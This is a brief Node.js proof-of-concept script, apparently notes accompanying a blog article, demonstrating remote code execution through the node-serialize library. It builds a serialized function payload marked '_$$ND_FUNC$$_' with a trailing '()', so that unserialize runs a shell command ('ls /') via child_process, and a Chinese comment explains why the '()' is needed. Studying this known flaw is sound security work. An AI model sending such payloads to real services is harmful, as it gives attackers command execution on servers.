// https://sking7.github.io/articles/1601216121.html

var serialize = require('node-serialize');

var code = {
    rce : function(){
        require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
    },
}

var payload = serialize.serialize(code);
console.log(payload);


payload = `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()"}`;

// 直接用 serialize 後的 payload 沒有用, 後面要加 () 才會執行
serialize.unserialize(payload);
